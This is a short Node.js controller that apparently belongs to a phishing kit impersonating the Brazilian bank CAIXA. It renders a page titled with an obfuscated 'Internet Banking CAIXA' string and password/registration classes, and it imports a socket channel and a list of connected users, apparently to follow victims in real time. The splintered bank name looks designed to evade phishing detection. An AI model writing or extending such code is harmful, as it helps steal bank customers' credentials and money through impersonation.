const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client

            const { client } = req.query

            const theClient = await Client.findByPk(client)

            return res.render('error', {
                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                pageClasses: 'password cadastro',
                //client: theClient.toJSON(),
                user: true,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
